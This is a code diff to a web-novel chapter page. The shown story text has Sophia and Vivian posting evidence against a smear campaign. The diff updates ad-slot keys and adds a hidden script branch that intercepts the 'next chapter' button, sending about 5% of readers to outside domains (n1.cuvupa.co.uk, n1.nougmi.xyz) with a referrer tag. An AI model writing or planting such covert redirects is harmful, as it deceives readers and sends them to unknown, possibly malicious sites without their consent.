@@ -2390,12 +2390,12 @@
                 <p>Sophia nodded, opening her laptop. &#34;Good thing I always back things up. The Clementson Code is still here.&#34;</p>
                 <p>Vivian&#39;s eyes lit up. &#34;This will go viral for sure!&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>She suddenly slammed the table. &#34;Wait! I have an audio recording—that conversation with Daniel&#39;s family at the private dining club last time. My phone accidentally recorded it in my pocket.&#34;</p>
                 <p>&#34;Send it.&#34; Sophia&#39;s fingers flew across the keyboard. &#34;I&#39;ll compile everything.&#34;</p>
                 <p>Thirty minutes later, a new post appeared on the university forum. Sophia tagged Mrs. Clementson: &#34;The truth speaks for itself. These slanderous rumors have caused significant harm. Police report filed. See you in court if you disagree.&#34;</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>The post included four pieces of evidence:</p>
                 <p>The original Clementson Code sent by Mrs. Clementson</p>
                 <p>The complete audio from the private dining club</p>
@@ -2415,7 +2415,7 @@
                 <p>&#34;Someone needs to investigate who&#39;s behind this smear campaign. Disgusting behavior!&#34;</p>
                 <p>Sophia closed the browser as her phone lit up—a text from an unknown number: &#34;You think this is over?&#34;</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
             </div>
             
             <div class="font-controls">
@@ -2537,7 +2537,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2553,8 +2553,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
